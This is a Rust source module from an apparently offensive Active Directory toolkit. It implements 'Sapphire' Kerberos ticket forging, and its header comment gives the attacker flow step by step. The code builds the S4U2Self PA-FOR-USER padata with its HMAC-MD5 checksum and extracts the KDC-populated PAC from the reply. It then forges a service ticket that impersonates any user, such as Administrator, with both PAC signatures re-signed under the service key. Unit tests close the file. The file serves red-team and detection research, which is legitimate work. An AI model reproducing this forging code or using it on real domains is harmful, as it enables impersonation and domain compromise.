//! Sapphire ticket primitives.
//!
//! # What Sapphire is
//!
//! Diamond ([`crate::diamond`]) still requires the krbtgt key. Sapphire doesn't. Instead, it uses
//! **S4U2Self** — any principal with a TGT can ask the KDC for a service ticket "on behalf of"
//! any other user. The KDC responds with a fully populated PAC for that target (group SIDs,
//! extra SIDs, PAC_REQUESTOR — every field the DC normally emits), and encrypts the ticket
//! under the caller's own service key.
//!
//! Attacker flow: (1) acquire a low-priv machine account with a TGT · (2) send S4U2Self with
//! `cname = <target user>` · (3) receive TGS-REP whose ticket is encrypted with the machine
//! account's own key (trivially decryptable) · (4) pull the KDC-populated PAC · (5) re-encrypt
//! it into any onward silver/diamond ticket — no krbtgt required.
//!
//! # What this module ships
//!
//! * [`build_pa_for_user`] — encode the PA-FOR-USER (padata type 129) entry the caller shoves
//!   into a TGS-REQ. Includes the HMAC-MD5 checksum over `userName || userRealm || "Kerberos"`
//!   under the caller's session key (key usage 17).
//! * [`extract_pac_from_enc_ticket_part`] — walk a decrypted `EncTicketPart`'s authorization-data
//!   and return the PAC bytes.
//! * [`forge_sapphire_service_ticket`] — take an extracted PAC + target SPN + service key and
//!   mint a service ticket with that PAC (silver-shape, KDC-populated PAC substituted in).
//!
//! # What this module does not ship
//!
//! No KDC transport (no AS-REQ / TGS-REQ send/recv). Wiring S4U2Self over the wire lives in
//! adhammer-kerberos.
//!
//! 1.5.3: rebuilt on kerbcore (was picky-krb). PA-FOR-USER already used hand-rolled DER;
//! only the ticket-build path changed.

use crate::checksum;
use crate::forge::{build_enc_ticket_part, build_pac_authdata, ForgedTicket};
use crate::pac::ForgeIdentity;
use crate::util::{
    now_kerberos_time, principal, ETYPE_AES256, ETYPE_RC4_HMAC, FAR_FUTURE, NT_PRINCIPAL,
    NT_SRV_INST,
};
use crate::{PacForgeError, Result};

/// Kerberos padata type identifier for `PA-FOR-USER` (RFC 4120 + MS-SFU).
pub const PA_FOR_USER: i32 = 129;

/// Key usage for the S4U2Self PA-FOR-USER checksum. MS-SFU §2.2.1.
pub const KEY_USAGE_S4U_CHECKSUM: i32 = 17;

/// KERB_CHECKSUM_HMAC_MD5 checksum type ID (RFC 4757, matches [`crate::checksum::SIG_HMAC_MD5`]).
pub const CKSUM_HMAC_MD5: i32 = -138;

/// Encode a `PA-FOR-USER` padata entry:
///
/// ```text
/// PA-FOR-USER ::= SEQUENCE {
///     userName     [0] PrincipalName,
///     userRealm    [1] Realm,
///     cksum        [2] Checksum,
///     auth-package [3] KerberosString  -- literally "Kerberos"
/// }
/// ```
///
/// Checksum: `HMAC-MD5(session_key, LE32(name_type) || each name-string || realm || "Kerberos")`
/// under key usage 17. `session_key` is the caller's TGT session key (RC4-HMAC: 16 bytes).
pub fn build_pa_for_user(
    target_user: &str,
    target_realm: &str,
    session_key: &[u8],
) -> Result<Vec<u8>> {
    if target_user.is_empty() || target_realm.is_empty() {
        return Err(PacForgeError::InvalidIdentity(
            "target user and realm must be non-empty".into(),
        ));
    }
    // The PA-FOR-USER checksum is HMAC-MD5 (cksumtype -138) at key usage 17, which only
    // pairs with an RC4-HMAC TGT session key (16 bytes). An AES session key would be silently
    // MD5'd into a checksum the KDC rejects, so reject it here rather than emit a bad padata.
    if session_key.len() != 16 {
        return Err(PacForgeError::InvalidIdentity(format!(
            "PA-FOR-USER checksum needs a 16-byte RC4-HMAC TGT session key, got {} bytes \
             (AES S4U2Self checksums are not supported by this helper)",
            session_key.len()
        )));
    }
    let auth_package = "Kerberos";
    let s4u_bytes = s4u_checksum_bytes(
        NT_PRINCIPAL as u32,
        &[target_user],
        target_realm,
        auth_package,
    );
    let cksum_bytes = checksum::hmac_md5_checksum(session_key, KEY_USAGE_S4U_CHECKSUM, &s4u_bytes);

    // Hand-DER (keeps the crate flat — same shape as before, no picky).
    let user_name = principal_name_der(NT_PRINCIPAL, &[target_user]);
    let user_realm = general_string_der(target_realm);
    let cksum = checksum_der(CKSUM_HMAC_MD5, &cksum_bytes);
    let auth_package_der = general_string_der(auth_package);

    let seq_body: Vec<u8> = [
        explicit_context(0, &user_name),
        explicit_context(1, &user_realm),
        explicit_context(2, &cksum),
        explicit_context(3, &auth_package_der),
    ]
    .concat();
    Ok(der_seq(&seq_body))
}

fn tag_len(tag: u8, contents: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(contents.len() + 6);
    out.push(tag);
    let len = contents.len();
    if len < 0x80 {
        out.push(len as u8);
    } else {
        let mut buf = [0u8; 8];
        let mut n = len;
        let mut i = buf.len();
        while n > 0 {
            i -= 1;
            buf[i] = (n & 0xff) as u8;
            n >>= 8;
        }
        let bytes = &buf[i..];
        out.push(0x80 | bytes.len() as u8);
        out.extend_from_slice(bytes);
    }
    out.extend_from_slice(contents);
    out
}
fn der_seq(contents: &[u8]) -> Vec<u8> {
    tag_len(0x30, contents)
}
fn der_octet(contents: &[u8]) -> Vec<u8> {
    tag_len(0x04, contents)
}
fn general_string_der(s: &str) -> Vec<u8> {
    tag_len(0x1B, s.as_bytes())
}
fn explicit_context(n: u8, inner_tlv: &[u8]) -> Vec<u8> {
    tag_len(0xA0 | (n & 0x1F), inner_tlv)
}
fn integer_content_signed(n: i32) -> Vec<u8> {
    if (-128..=127).contains(&n) {
        vec![n as u8]
    } else if (-32_768..=32_767).contains(&n) {
        (n as i16).to_be_bytes().to_vec()
    } else {
        n.to_be_bytes().to_vec()
    }
}
fn integer_der(n: i32) -> Vec<u8> {
    tag_len(0x02, &integer_content_signed(n))
}
fn principal_name_der(name_type: i32, parts: &[&str]) -> Vec<u8> {
    let strings: Vec<u8> = parts.iter().flat_map(|p| general_string_der(p)).collect();
    let name_string_seq = der_seq(&strings);
    let body = [
        explicit_context(0, &integer_der(name_type)),
        explicit_context(1, &name_string_seq),
    ]
    .concat();
    der_seq(&body)
}
fn checksum_der(cksumtype: i32, cksum: &[u8]) -> Vec<u8> {
    let body = [
        explicit_context(0, &integer_der(cksumtype)),
        explicit_context(1, &der_octet(cksum)),
    ]
    .concat();
    der_seq(&body)
}

/// Extract the PAC bytes from an already-decrypted `EncTicketPart` (from an S4U2Self reply after
/// decrypt with the machine account's own key).
pub fn extract_pac_from_enc_ticket_part(
    etp: &kerbcore::acceptor::EncTicketPart,
) -> Result<Vec<u8>> {
    if etp.authorization_data.is_empty() {
        return Err(PacForgeError::NoAuthData);
    }
    crate::pac::extract_pac(&etp.authorization_data)
}

/// Forge a service ticket carrying an externally-supplied PAC (the KDC-populated one you
/// extracted from an S4U2Self reply). Sealed under `service_key`; both PAC signatures re-signed
/// with the same key so the service accepts the ticket without contacting the KDC.
pub fn forge_sapphire_service_ticket(
    pac_bytes: Vec<u8>,
    realm: &str,
    service_key: &[u8],
    sname_parts: &[&str],
    sapphire_identity: &ForgeIdentity,
    rc4: bool,
) -> Result<ForgedTicket> {
    let realm_up = realm.to_uppercase();
    let etype = if rc4 { ETYPE_RC4_HMAC } else { ETYPE_AES256 };

    // Re-sign the PAC's SERVER + KDC checksums with `service_key` before sealing (silver shape).
    let resigned = crate::pac::re_sign_pac(&pac_bytes, service_key, service_key, rc4)
        .map_err(|e| PacForgeError::Signature(format!("re-sign PAC for sapphire: {e}")))?;

    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
    let cname = principal(NT_PRINCIPAL, &[sapphire_identity.user.as_str()]);
    let now = now_kerberos_time();
    let authdata = build_pac_authdata(&resigned);

    // Sapphire flags 0x40a10000 (forwardable, renewable, pre-authent — no `initial`, no `proxiable`,
    // matches the prior picky-shaped ticket byte-for-byte).
    let enc = build_enc_ticket_part(
        etype,
        &sk,
        &realm_up,
        &cname,
        0x40a1_0000,
        &now,
        &now,
        FAR_FUTURE,
        FAR_FUTURE,
        &authdata,
        service_key,
    )?;

    let ticket = kerbcore::messages::Ticket {
        tkt_vno: 5,
        realm: realm_up.clone(),
        sname: principal(NT_SRV_INST, sname_parts),
        enc_part: kerbcore::types::EncryptedData {
            etype: etype as i32,
            kvno: None,
            cipher: enc,
        },
    };

    Ok(ForgedTicket::from_parts(ticket, sk, cname, realm_up))
}

fn s4u_checksum_bytes(
    name_type: u32,
    name_string: &[&str],
    realm: &str,
    auth_package: &str,
) -> Vec<u8> {
    // MS-SFU §2.2.1: LE32(name-type) || each name-string in order || realm || auth-package
    let mut v = Vec::new();
    v.extend_from_slice(&name_type.to_le_bytes());
    for s in name_string {
        v.extend_from_slice(s.as_bytes());
    }
    v.extend_from_slice(realm.as_bytes());
    v.extend_from_slice(auth_package.as_bytes());
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pa_for_user_encodes_and_is_deterministic() {
        let key = [0x42u8; 16];
        let a = build_pa_for_user("Administrator", "CORP.LOCAL", &key).unwrap();
        let b = build_pa_for_user("Administrator", "CORP.LOCAL", &key).unwrap();
        assert_eq!(a, b, "same input must produce same padata bytes");
        assert!(!a.is_empty());
        assert_eq!(a[0], 0x30);
    }

    #[test]
    fn pa_for_user_rejects_empty() {
        assert!(build_pa_for_user("", "CORP.LOCAL", &[0u8; 16]).is_err());
        assert!(build_pa_for_user("alice", "", &[0u8; 16]).is_err());
    }

    #[test]
    fn pa_for_user_cksum_changes_with_user() {
        let key = [0x42u8; 16];
        let a = build_pa_for_user("Administrator", "CORP.LOCAL", &key).unwrap();
        let b = build_pa_for_user("Guest", "CORP.LOCAL", &key).unwrap();
        assert_ne!(a, b);
    }

    #[test]
    fn pa_for_user_rejects_non_rc4_key() {
        // A 32-byte AES key must be rejected, not silently MD5'd into a checksum the KDC drops.
        assert!(build_pa_for_user("Administrator", "CORP.LOCAL", &[0u8; 32]).is_err());
    }
}
